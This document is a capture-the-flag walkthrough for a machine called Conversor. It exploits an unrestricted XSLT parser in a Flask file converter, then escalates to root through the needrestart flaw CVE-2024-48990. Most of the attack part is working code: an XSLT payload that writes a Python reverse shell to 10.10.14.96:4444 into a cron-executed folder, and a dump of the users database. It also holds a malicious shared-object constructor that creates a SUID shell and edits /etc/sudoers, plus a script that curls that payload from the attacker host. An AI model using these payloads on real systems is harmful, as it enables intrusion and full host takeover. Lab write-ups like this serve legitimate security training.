# Conversor   
 

<img width="1609" height="363" alt="image" src="https://github.com/user-attachments/assets/afaef089-929a-44cb-8566-d61fbb50105a" />

## **`Nmap`** Scan

```ruby
namp -sCV MACHINE-IP
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 14:04 EST
Nmap scan report for 10.10.11.92
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.94 seconds
                                                                                                  
```

## login with any usernaem and password

```
http://conversor.htb/about
```

<img width="1228" height="755" alt="image" src="https://github.com/user-attachments/assets/2284f14b-2442-445d-abe0-56879933bdc9" />

```
tar -xvf source_code.tar.gz
```

<img width="1089" height="584" alt="image" src="https://github.com/user-attachments/assets/7b780065-03a3-44ce-ac90-84ca62539063" />

The application is built with Python Flask. Let's examine the key sections of `app.py`:

<img width="1331" height="241" alt="image" src="https://github.com/user-attachments/assets/58539bae-6295-4a6f-882d-b3833c05c803" />

**`NO PARSER CONFIGURATION HERE!`**

The Vulnerability: While the XML parsing is properly secured with `resolve_entities=False` and `no_network=True`, the XSLT file parsing has no security restrictions applied. This discrepancy creates an XXE (XML External Entity) vulnerability specifically in the XSLT processing.

### Attack Vector: XXE in the XSLT file itself!

<https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/>

---

After examining the `install.md` file, we discover a critical piece of information:

```markdown
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

There's a cron job running every minute as www-data:

```bash
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

-   I created a basic XML file (`test.xml`):

```xml
nano test.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <cd>
    <title>Test</title>
    <artist>death</artist>
    <company>xyz Company</company>
    <price>1</price>
    <year>2300</year>
  </cd>
</catalog>
```

-   Then I wrote the XSLT payload (`test.xslt`) with my IP and port:

```xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:exploit="http://exslt.org/common"
 extension-element-prefixes="exploit"
 version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.96",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

<img width="1104" height="516" alt="image" src="https://github.com/user-attachments/assets/f425254a-e60b-426a-8d3a-f3b56f4a72a0" />

<img width="745" height="158" alt="image" src="https://github.com/user-attachments/assets/afc15be1-24e0-4451-b830-29fc52a38e09" />

```ruby
python3 -c 'import pty,os; pty.spawn("/bin/bash")'
```

```
cd /var/www/conversor.htb
cd instance
sqlite3 ./users.db "SELECT * FROM users;"
```

<img width="606" height="102" alt="image" src="https://github.com/user-attachments/assets/e3a3514e-7cb0-4e5a-9fbd-b8d90dbb443e" />

<img width="1517" height="558" alt="image" src="https://github.com/user-attachments/assets/d60d6fdb-493b-4597-bffe-88f73077fa23" />

```
ssh fismathack@10.10.10.10
```

<img width="763" height="259" alt="image" src="https://github.com/user-attachments/assets/56a2d242-d5c6-4f79-809e-c244435b31c1" />

## PrivEsc

<img width="1266" height="498" alt="image" src="https://github.com/user-attachments/assets/e659c933-cac8-442c-86b7-d2f100439eca" />

## [CVE-2024-48990](https://github.com/ns989/CVE-2024-48990?source=post_page-----330f55df8c2f---------------------------------------)

<img width="971" height="198" alt="image" src="https://github.com/user-attachments/assets/93d98924-7b24-4310-a517-7674329d3ac9" />

---

The **needrestart** program scans the processes and checks if they need to be restarted after updating libraries in the system.

The disaster?\
Version **3.7-a and earlier** works:

✔ Check **for Python modules**\
✔ Using **importlib**\
✔ **No sandboxing or path restriction**

This means that:

>If the attacker was able to make needrestart do "import" for the Python model\
> It will load any shared object `.so` file located inside PYTHONPATH\
> Any **shared object** can run code with ROOT privileges\
> Because needrestart works with sudo.

This is the essence of privilege escalation.

* * * * *

🧩 **Exploiting the vulnerability --- Step by Step**
=================================================

1️⃣ **Confirm there is needrestart**
------------------------------

First step:

`/usr/sbin/needrestart -v`

You will find the version:

`3.7-a`

This is a *vulnerable* version according to the CVE.

2️⃣ **Offensive idea**
-----------------------

We work:

- Shared object (`__init__.so`) has malicious constructor.

- Let needrestart run **import importlib** from the folder we created.

- The shared object is replaced by the real library.

- The first thing to do is---the code will be executed with ROOT privileges.

---

## on my machine

```
nano lib.c
```

```c
static void a() __attribute__((constructor));
void a() {
    if(geteuid() == 0) { 
        setuid(0);
        setgid(0);
        const char *shell = "cp /bin/sh /tmp/poc; "
                            "chmod u+s /tmp/poc; "
                            "grep -qxF 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' /etc/sudoers || "
                            "echo 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' >> /etc/sudoers";
        system(shell);
    }
}

```

```
gcc -shared -fPIC -o __init__.so lib.c
```

```
python3 -m http.server 8888
```

## on server

```
nano exploit.sh
```

```
#!/bin/bash
set -e
cd /tmp
mkdir -p malicious/importlib
curl http://10.10.14.96:8888/__init__.so -o /tmp/malicious/importlib/__init__.so
cat << 'EOF' > /tmp/malicious/e.py
import time
import os

while True:
    try:
        import importlib
    except:
        pass
    if os.path.exists("/tmp/poc"):
        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
        os.system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF
echo "Bait process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell."
cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null

```

<img width="819" height="95" alt="image" src="https://github.com/user-attachments/assets/7e728e80-aa8a-45fc-8eea-506e672b6344" />

## in another shell run 

```
sudo /usr/sbin/needrestart
```

<img width="1127" height="376" alt="image" src="https://github.com/user-attachments/assets/a192e975-44f1-40dc-9d50-92345aba9834" />

a summary
-----

- **Vulnerability**: Downloading a malicious library with root privileges via `needrestart`.

- **Exploit**: Writing a malicious C library that executes root code.

- **Root access**: By running the SUID shell (`/tmp/poc` file) it gives you root privileges.

